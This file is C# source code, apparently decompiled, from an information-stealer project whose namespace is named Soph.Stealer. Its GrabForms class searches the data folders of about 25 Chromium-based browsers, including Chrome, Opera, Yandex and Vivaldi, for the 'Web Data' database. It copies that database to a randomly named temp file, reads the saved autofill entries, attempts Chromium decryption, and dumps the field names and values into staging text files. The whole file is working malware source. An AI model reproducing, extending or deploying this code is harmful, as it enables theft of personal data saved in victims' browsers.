using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Soph.Autofill;
using Soph.Stealer;

// Token: 0x02000017 RID: 23
internal static class GrabForms
{
	// Token: 0x06000043 RID: 67
	public static void grab_forms(string string_0)
	{
		string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
		string[] array = new string[]
		{
			environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Web Data",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data",
			environmentVariable + "\\Kometa\\User Data\\Default\\Web Data",
			environmentVariable + "\\Orbitum\\User Data\\Default\\Web Data",
			environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
			environmentVariable + "\\Amigo\\User\\User Data\\Default\\Web Data",
			environmentVariable + "\\Torch\\User Data\\Default\\Web Data",
			environmentVariable + "\\CentBrowser\\User Data\\Default\\Web Data",
			environmentVariable + "\\Go!\\User Data\\Default\\Web Data",
			environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Web Data",
			environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Web Data",
			environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Web Data",
			environmentVariable + "\\BlackHawk\\User Data\\Default\\Web Data",
			environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Web Data",
			environmentVariable + "\\CoolNovo\\User Data\\Default\\Web Data",
			environmentVariable + "\\Epic Browser\\User Data\\Default\\Web Data",
			environmentVariable + "\\Baidu Spark\\User Data\\Default\\Web Data",
			environmentVariable + "\\Rockmelt\\User Data\\Default\\Web Data",
			environmentVariable + "\\Sleipnir\\User Data\\Default\\Web Data",
			environmentVariable + "\\SRWare Iron\\User Data\\Default\\Web Data",
			environmentVariable + "\\Titan Browser\\User Data\\Default\\Web Data",
			environmentVariable + "\\Flock\\User Data\\Default\\Web Data",
			environmentVariable + "\\Vivaldi\\User Data\\Default\\Web Data",
			environmentVariable + "\\Sputnik\\User Data\\Default\\Web Data",
			environmentVariable + "\\Maxthon\\User Data\\Default\\Web Data"
		};
		foreach (string text in array)
		{
			try
			{
				string str = "";
				if (text.Contains("Chrome"))
				{
					str = "Google";
				}
				if (text.Contains("Yandex"))
				{
					str = "Yandex";
				}
				if (text.Contains("Orbitum"))
				{
					str = "Orbitum";
				}
				if (text.Contains("Opera"))
				{
					str = "Opera";
				}
				if (text.Contains("Amigo"))
				{
					str = "Amigo";
				}
				if (text.Contains("Torch"))
				{
					str = "Torch";
				}
				if (text.Contains("Comodo"))
				{
					str = "Comodo";
				}
				if (text.Contains("CentBrowser"))
				{
					str = "CentBrowser";
				}
				if (text.Contains("Go!"))
				{
					str = "Go!";
				}
				if (text.Contains("uCozMedia"))
				{
					str = "uCozMedia";
				}
				if (text.Contains("MapleStudio"))
				{
					str = "MapleStudio";
				}
				if (text.Contains("BlackHawk"))
				{
					str = "BlackHawk";
				}
				if (text.Contains("CoolNovo"))
				{
					str = "CoolNovo";
				}
				if (text.Contains("Vivaldi"))
				{
					str = "Vivaldi";
				}
				if (text.Contains("Sputnik"))
				{
					str = "Sputnik";
				}
				if (text.Contains("Maxthon"))
				{
					str = "Maxthon";
				}
				if (text.Contains("AcWebBrowser"))
				{
					str = "AcWebBrowser";
				}
				if (text.Contains("Epic Browser"))
				{
					str = "Epic Browser";
				}
				if (text.Contains("Baidu Spark"))
				{
					str = "Baidu Spark";
				}
				if (text.Contains("Rockmelt"))
				{
					str = "Rockmelt";
				}
				if (text.Contains("Sleipnir"))
				{
					str = "Sleipnir";
				}
				if (text.Contains("SRWare Iron"))
				{
					str = "SRWare Iron";
				}
				if (text.Contains("Titan Browser"))
				{
					str = "Titan Browser";
				}
				if (text.Contains("Flock"))
				{
					str = "Flock";
				}
				try
				{
					List<FormData> list = GrabForms.smethod_1(text);
					if (list != null)
					{
						Directory.CreateDirectory(string_0 + "\\Autofill\\");
						using (StreamWriter streamWriter = new StreamWriter(string_0 + "\\Autofill\\" + str + "_Autofill.txt"))
						{
							
							foreach (FormData formData in list)
							{
								streamWriter.Write(formData.Name + "\t" + formData.Value + "\r\n");
							}
						}
					}
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}

	// Token: 0x06000044 RID: 68 RVA: 0x0000559C File Offset: 0x0000379C
	private static List<FormData> smethod_1(string string_0)
	{
		List<FormData> result;
		if (!File.Exists(string_0))
		{
			result = null;
		}
		else
		{
			try
			{
				string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_0, text, true);
                Sqlite sqlite = new Sqlite(text);
                sqlite.ReadTable("Autofill");
				List<FormData> list = new List<FormData>();
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					try
					{
						try
						{
							Encoding.UTF8.GetString(Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null));
						}
						catch (Exception)
						{
						}
						bool flag;
						bool.TryParse(sqlite.GetValue(i, 6), out flag);
						list.Add(new FormData
						{
							Name = sqlite.GetValue(i, 0),
							Value = sqlite.GetValue(i, 1)
						});
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
					}
				}
				result = list;
			}
			catch
			{
				result = new List<FormData>();
			}
		}
		return result;
	}
}
